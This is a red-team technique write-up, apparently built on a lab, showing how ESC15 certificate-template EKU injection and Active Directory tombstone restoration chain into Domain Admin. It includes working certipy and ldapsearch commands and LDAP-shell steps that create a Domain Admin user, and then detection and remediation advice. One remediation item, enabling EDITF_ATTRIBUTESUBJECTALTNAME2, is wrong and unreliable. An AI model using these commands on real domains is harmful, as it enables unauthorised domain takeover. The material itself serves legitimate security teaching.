---
title: "ESC15 and Tombstone Restoration — From Deleted Objects to Domain Admin"
description: "How schema version 1 certificate templates enable arbitrary EKU injection (ESC15 / CVE-2024-49019), and how the Reanimate-Tombstones permission can be abused to recover a deleted certificate admin account and chain both techniques into a full Active Directory compromise."
date: 2026-09-23
type: "Technique · Active Directory"
category: "Red Team"
difficulty: "Advanced"
readingTime: 18
tags: [esc15, adcs, cve-2024-49019, tombstone-restoration, reanimate-tombstones, active-directory, certificate-templates, eku-injection, ad-recycle-bin]
---

## The premise

Active Directory Certificate Services (AD CS) has been a major focus of offensive security research since the Certified Pre-Owned whitepaper in 2021. The ESC1-ESC8 escalation paths documented there have been widely publicized, and most organizations that care about ADCS security have hardened their certificate templates against those specific misconfigurations.

ESC15 (CVE-2024-49019) is a newer escalation path that exploits a different aspect of the ADCS enrollment process: the way schema version 1 templates handle application policies (EKUs) in the certificate signing request. It was discovered by TrustedSec in 2024 and patched by Microsoft in November 2024.

This article covers two techniques that, when combined, create a complete path from assumed-breach credentials to Domain Admin:

1. **ESC15** — exploiting schema v1 certificate templates to inject arbitrary EKUs and impersonate any domain user.
2. **Reanimate-Tombstones** — abusing the Active Directory Recycle Bin to restore a deleted object with sensitive permissions.

The techniques are presented in the context of the TombWatcher lab environment, where the combination of these two misconfigurations enabled full domain compromise.

For the complete engagement that used these techniques end to end — from the assumed-breach credential to Domain Admin — see the **[TombWatcher penetration test report →](/projects/tombwatcher-ad-compromise)**.

## Part one — What ESC15 actually is

ESC15 is not a single vulnerability in the traditional sense. It is a logical flaw in how ADCS handles schema version 1 certificate templates during enrollment.

### The role of schema versions

ADCS certificate templates have a schema version that determines what features and validations apply:

| Schema Version | Description |
|---|---|
| **Version 1** | Legacy templates. Limited editability. Introduced in Windows 2000. |
| **Version 2** | Introduced in Windows Server 2003. Adds more configurable extensions. |
| **Version 3** | Introduced in Windows Server 2008. Adds additional features. |
| **Version 4** | Introduced in Windows Server 2012. Current version. |

Schema version 1 templates were created for compatibility with older Windows versions. They have a critical characteristic: **they do not validate the Application Policies extension in the certificate signing request (CSR)**.

### The application policies extension

The Application Policies extension (also known as Extended Key Usage or EKU) defines what the certificate can be used for. Common EKUs include:

- `1.3.6.1.5.5.7.3.1` — Server Authentication
- `1.3.6.1.5.5.7.3.2` — Client Authentication
- `1.3.6.1.5.5.7.3.4` — Email Protection

When a certificate is used for authentication (like in Kerberos PKINIT or LDAP Schannel), the receiving service checks the EKUs to determine if the certificate is authorized for that purpose.

### The vulnerability

On schema version 1 templates, the CA **does not validate the Application Policies extension in the CSR**. If the template also allows the enrollee to supply the subject (which many default templates do), an attacker can:

1. Request a certificate using a schema v1 template.
2. Specify a subject (UPN) of a privileged user (e.g., `Administrator@domain.htb`).
3. Inject a Client Authentication EKU into the Application Policies extension of the CSR.

Because the CA does not validate the Application Policies on v1 templates, it copies the injected EKU into the issued certificate. The result is a certificate that:
- Has a subject matching the privileged user
- Has a Client Authentication EKU
- Can be used to authenticate as that user

This is ESC15 — sometimes called "EKUwu" because it abuses the EKU extension in an unexpected way.

### Why this is different from ESC1

ESC1 also allows an attacker to supply a subject in the CSR, but it requires the template to be explicitly misconfigured with `ENROLLEE_SUPPLIES_SUBJECT` and lacks the restrictions that would normally prevent abuse. ESC15 does not require that specific misconfiguration — it exploits the default behavior of schema v1 templates, which many organizations have left in place because they appear harmless.

The distinction is important: **ESC15 affects default templates that organizations did not know were vulnerable**. The `WebServer` template in the TombWatcher environment is a default Windows template that has schema version 1 and allows the enrollee to supply the subject. It was never intentionally misconfigured — it was simply never updated.

## Part two — Exploiting ESC15 in practice

The exploitation has three stages: enumeration, CSR crafting, and authentication.

### Stage 1 — Enumerate the CA and templates

```bash
certipy-ad find -u john@tombwatcher.htb -p 'Pwned123!' -dc-ip 10.129.232.167 -stdout -vulnerable
```

This command enumerates the CA configuration and all certificate templates, filtering only those that are vulnerable. The output for TombWatcher:

```
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates
  Template Name                       : WebServer
  Schema Version                      : 1
  Enrollee Supplies Subject           : True
  [!] Vulnerabilities
    ESC15                             : Enrollee can supply subject and schema version is 1
```

The `WebServer` template is flagged as vulnerable. The two properties that make it exploitable are:
- **Schema Version 1**: The CA does not validate the Application Policies extension.
- **Enrollee Supplies Subject**: The requester can specify the subject (UPN) in the CSR.

### Stage 2 — Request the certificate

```bash
certipy-ad req -u cert_admin@tombwatcher.htb -p 'NewPassword123!' \
  -ca tombwatcher-CA-1 \
  -template WebServer \
  -upn Administrator@tombwatcher.htb \
  -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
  -application-policies 'Client Authentication' \
  -dc-ip 10.129.232.167
```

The `-application-policies` flag injects the Client Authentication EKU into the CSR. The `-upn` and `-sid` flags specify the identity to impersonate (Administrator).

The CA issues the certificate and saves it to `administrator.pfx`.

### Stage 3 — Authenticate with the certificate

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
```

The `-ldap-shell` flag opens an interactive LDAP shell where you can perform AD administration. The certificate is accepted by LDAP because it has a valid Client Authentication EKU and a subject matching Administrator.

```
# add_user pentest_user
Adding new user with username: pentest_user ... result: OK

# add_user_to_group pentest_user "Domain Admins"
Adding user: pentest_user to group Domain Admins result: OK

# change_password pentest_user 'Password123!'
Password changed successfully!
```

We now have a Domain Admin user and can access the DC via WinRM.

## Part three — Tombstone restoration

The ESC15 exploitation requires a user with enrollment rights on the `WebServer` template. In the TombWatcher environment, the user with those rights was `cert_admin` — a deleted account. To use it, we first had to restore it from the Active Directory Recycle Bin.

### What is a tombstone?

When an object is deleted from Active Directory, it is not immediately removed from the database. Instead, it is marked with the `isDeleted=TRUE` attribute and moved to the `CN=Deleted Objects` container. This container is the AD Recycle Bin. Objects in this container are called "tombstones" and remain for a configurable period (default 180 days) before being permanently deleted.

### The Reanimate-Tombstones permission

Restoring an object from the Recycle Bin requires the `Reanimate-Tombstones` extended permission on the domain root. This permission allows a user to:

1. Remove the `isDeleted` flag from an object.
2. Move the object to a new location (or back to its original parent).

By default, only Domain Admins and Enterprise Admins have this permission.

### Why this matters for the attack

In the TombWatcher environment, the user `john` had `Reanimate-Tombstones` on the domain. The `WebServer` template had enrollment rights for a SID with RID 1111 — an object that no longer existed. By restoring the tombstone with that SID, we recovered an account that had enrollment rights on the vulnerable template.

The SID of a deleted object is preserved in the tombstone. By matching the RID (the last component of the SID) with the orphaned SID in the template ACL, we can identify exactly which tombstone to restore.

### Identifying the correct tombstone

We searched the `CN=Deleted Objects` container and decoded the SIDs:

```bash
ldapsearch -x -H ldap://10.129.232.167 -D 'john@tombwatcher.htb' -w 'Pwned123!' \
  -b "CN=Deleted Objects,DC=tombwatcher,DC=htb" -s sub "(objectClass=*)" \
  -E '!showdeleted' "*" "+"
```

The output showed three `cert_admin` tombstones. The `objectSid` is base64-encoded. The last 4 bytes of the SID are the RID:

| GUID | RID |
|---|---|
| `f80369c8-...` | 1109 |
| `c1f1f0fe-...` | 1110 |
| **`938182c3-...`** | **1111** |

The one with RID 1111 was the one with enrollment rights on `WebServer`.

### Restoring the tombstone

Restoration is a single LDAP operation. You cannot do `modrdn` separately and then remove `isDeleted`, because the object is in an inconsistent state between the two operations.

The LDAP modification uses the Show Deleted Objects control (`1.2.840.113556.1.4.417`) and modifies two attributes in a single transaction: deletes `isDeleted` and replaces `distinguishedName` to move the object to `OU=ADCS`.

### Post-restoration

After restoration, `cert_admin` was an active object in `OU=ADCS`. Because `john` had `GenericAll` on that OU with `CONTAINER_INHERIT`, the restored object inherited the `GenericAll` ACE, which includes `User-Force-Change-Password`. The tester reset the password and used `cert_admin` to request the ESC15 certificate.

## Part four — The full chain

The two techniques combine into a complete path:

1. `john` has `GenericAll` on `OU=ADCS` and `Reanimate-Tombstones` on the domain.
2. Enumerate ADCS → `WebServer` template is vulnerable to ESC15.
3. Inspect `WebServer` ACL → orphaned SID with RID 1111 has enrollment rights.
4. Search Deleted Objects → three `cert_admin` tombstones, RID 1111 matches.
5. Restore the tombstone → `cert_admin` is active in `OU=ADCS`.
6. Reset `cert_admin` password (inherited `GenericAll`).
7. Request ESC15 certificate → impersonate Administrator.
8. Authenticate with certificate → create Domain Admin user.
9. Full domain compromise.

Each step depends on the previous one. Without the tombstone restoration, the ESC15 exploitation is impossible because no active account has enrollment rights on the vulnerable template. Without the ESC15 vulnerability, the restored account would not grant Domain Admin access.

For the complete attack path — including the initial foothold, the Kerberoasting chain, the gMSA extraction, and the Shadow Credentials step — see the **[TombWatcher penetration test report →](/projects/tombwatcher-ad-compromise)**.

## Part five — Detection and defense

### ESC15 detection

**On the CA:**
- **Event ID 4886 / 4887** — certificate issuance. A certificate issued for `Administrator` outside a maintenance window is a strong indicator.
- **Event ID 4899** — certificate template loaded. Monitor for schema v1 templates being loaded.

**On the network:**
- **LDAP traffic** — monitor for certificate enrollment requests with unusual Application Policies.
- **Certificate requests** — monitor for requests with EKUs that do not match the template's configured EKUs.

### Tombstone restoration detection

**On the domain controller:**
- **Event ID 4662** — an operation was performed on an object. Filter for the `Reanimate-Tombstones` GUID.
- **Event ID 4742** — a computer account was changed. This event fires when a tombstone is restored.
- **Event ID 5136** — a directory service object was modified. The `isDeleted` attribute change is logged here.

### Remediation

**For ESC15:**
- **Patch ADCS servers** to fix CVE-2024-49019 (November 2024 update).
- **Remove enrollment rights from schema v1 templates** if they are not required.
- **Upgrade templates to schema v3 or v4** if the template features are needed.
- **Enable `EDITF_ATTRIBUTESUBJECTALTNAME2` protection** on the CA.

**For tombstone restoration:**
- **Restrict `Reanimate-Tombstones`** to Domain Admins only.
- **Audit deleted objects** for sensitive permissions before permanent deletion.
- **Monitor for tombstone restoration events** and alert on any non-administrative restoration.

## Part six — References and further reading

- **TrustedSec ESC15 research** — the original discovery of the EKU injection vulnerability.
- **Microsoft CVE-2024-49019** — the official advisory and patch information.
- **Certified Pre-Owned whitepaper** (SpecterOps, 2021) — ESC1-ESC8. The foundational ADCS offensive security research.
- **MITRE ATT&CK T1649** — Steal or Forge Authentication Certificates.
- **MITRE ATT&CK T1558.003** — Kerberoasting.
- **Certipy documentation** — the tool used for ESC15 exploitation and Shadow Credentials.
- **Impacket owneredit.py** — the tool used for WriteOwner abuse.
- **gMSADumper** — the tool used for gMSA password extraction.

## Takeaway

ESC15 and tombstone restoration are two misconfigurations that, when combined, create a complete path from assumed-breach credentials to Domain Admin. Neither technique alone would be sufficient — ESC15 requires an account with enrollment rights, and the tombstone restoration provides that account.

The key lesson for defenders is that **ADCS requires continuous auditing**. Schema version 1 templates are often left in place for compatibility reasons, but they are vulnerable to ESC15 by design. The November 2024 patch addresses the vulnerability, but unpatched systems remain exposed.

The second lesson is that **deleted objects are not gone forever**. The AD Recycle Bin preserves tombstones with their SIDs and permissions intact. An attacker with `Reanimate-Tombstones` can restore a deleted account and use its permissions — even if those permissions were revoked before deletion. Organizations should audit the permissions of deleted objects before they are permanently removed.

For the full engagement that used this chain end to end, see the **[TombWatcher penetration test report →](/projects/tombwatcher-ad-compromise)**.
